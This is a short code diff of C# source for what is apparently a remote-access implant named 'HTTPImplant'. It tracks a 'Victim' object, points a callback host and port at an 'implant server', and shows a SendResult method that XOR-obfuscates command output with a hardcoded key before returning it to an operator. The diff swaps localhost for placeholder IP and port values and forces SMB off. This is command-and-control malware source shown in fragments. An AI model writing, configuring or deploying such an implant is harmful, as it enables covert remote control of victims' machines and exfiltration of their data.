@@ -42,8 +42,8 @@ namespace HTTPImplant
     public class Implant
     {
         public static Victim victim = new Victim();
-        public static string host = "localhost";  // Host of the implant server
-        public static string port = "8083"; // Port of the implant server
+        public static string host = "<IP>";  // Host of the implant server
+        public static string port = "<PORT>"; // Port of the implant server
         private static string lastCommandExecuted = string.Empty; // Store the last command that was executed
         public static bool SMB = false;
         private static bool usesmb;
@@ -204,6 +204,7 @@ namespace HTTPImplant
 
         public static async Task SendResult(WebClient webClient, string implantId, string operatorId, string outputBase64, bool useSMB)
         {
+            useSMB = false;
             string XORKeyB64 = "NVm5dzr1hyhOm4jBTNSFhQGrFhR1gvhbn/BbvZowkO0=";
             byte[] XORKey = Convert.FromBase64String(XORKeyB64);
 
